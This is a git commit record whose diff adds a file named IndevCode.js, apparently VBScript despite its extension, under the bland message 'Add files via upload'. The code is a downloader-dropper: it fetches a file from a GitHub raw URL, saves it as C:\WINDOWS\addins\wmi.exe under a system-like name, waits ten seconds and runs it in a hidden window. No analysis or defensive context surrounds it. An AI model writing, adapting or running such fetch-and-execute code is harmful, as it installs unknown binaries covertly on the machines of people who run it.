5a96b4f82633f56c051a026a8ebc1484b7fcdc1f
KillTimeSummer <u223110@outlook.com>
2018-02-11 14:14:23 +0800

    Add files via upload

---
+++ IndevCode.js
@@ -0,0 +1,12 @@
+Set Post=CreateObject("Msxml2.XMLHTTP") 
+Set Shell=CreateObject("Wscript.Shell") 
+Post.Open "GET","https://raw.githubusercontent.com/KillTimeSummer/clopro/master/xRd.ev",0 
+Post.Send() 
+Set aGet=CreateObject("ADODB.Stream") 
+aGet.Mode=3 
+aGet.Type=1 
+aGet.Open() 
+aGet.Write(Post.responseBody) 
+aGet.SaveToFile "C:\WINDOWS\addins\wmi.exe",2 
+wscript.sleep 10000 
+Shell.Run ("C:\WINDOWS\addins\wmi.exe"),vbhide
